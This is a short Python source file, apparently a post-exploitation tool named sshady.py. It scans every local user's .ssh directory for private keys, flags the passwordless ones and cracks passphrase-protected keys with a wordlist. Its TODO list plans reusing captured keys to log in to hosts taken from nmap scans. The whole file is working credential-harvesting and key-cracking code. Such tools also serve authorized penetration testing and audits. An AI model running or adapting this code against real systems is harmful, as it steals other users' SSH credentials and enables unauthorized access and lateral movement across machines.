#!/usr/bin/env python

"""
sshady.py -- SSH key pivoting things.
          -- by Daniel Roberson @dmfroberson
TODO:
  - argparse
    -- specify wordlist
    -- pre-stored BS passwords
    -- --terse flag for use in cron.daily
  - Cracking improvements
    -- common passwords
    -- username as pass
  - Store keys for the future
- Attempt to login to supplied hosts using captured keys (nmap output as input!)

Requires:
  - paramiko
"""

import os
import pwd
import paramiko

WORDLIST = "words.txt"

def crack_key(keyfile, wordlist):
    ssh_key_types = [paramiko.RSAKey.from_private_key_file,
                     paramiko.DSSKey.from_private_key_file,
                     paramiko.ECDSAKey.from_private_key_file]

    with open(wordlist) as passwords:
        for password in passwords:
            for key_type in ssh_key_types:
                password = password.rstrip()
                if not password:
                    continue

                try:
                    key_type(keyfile, password=password)
                except paramiko.ssh_exception.SSHException:
                    continue
                print "      [+] Success! %s:%s" % (keyfile, password)
                return True
    return False


def try_key(keyfile):
    ssh_key_types = [paramiko.RSAKey.from_private_key_file,
                     paramiko.DSSKey.from_private_key_file,
                     paramiko.ECDSAKey.from_private_key_file]

    for key_type in ssh_key_types:
        try:
            key_type(keyfile)
        except paramiko.ssh_exception.PasswordRequiredException:
            # Valid key, but requires a password. Skip.
            print "  [-] %s appears to be a valid key" % keyfile
            print "    [*] Attempting to crack SSH key.."
            crack_key(keyfile, WORDLIST)

            continue
        except paramiko.ssh_exception.SSHException:
            # Probably not a valid key at all. Skip.
            continue

        print "  [+] %s appears to be a valid, passwordless key" % keyfile

    return


def main():
    print "[+] Searching for passwordless SSH keys"
    print

    for pwent in pwd.getpwall():
        user = pwent[0]
        sshdir = os.path.join(os.path.expanduser("~%s" % user), ".ssh")

        if os.path.isdir(sshdir):
            print "[*] Found .ssh directory for user %s: %s" % (user, sshdir)
            for root, _, filenames in os.walk(sshdir):
                for filename in filenames:
                    checkfile = os.path.join(root, filename)
                    try_key(checkfile)

    print
    print "[+] Done."
    return


if __name__ == "__main__":
    main()
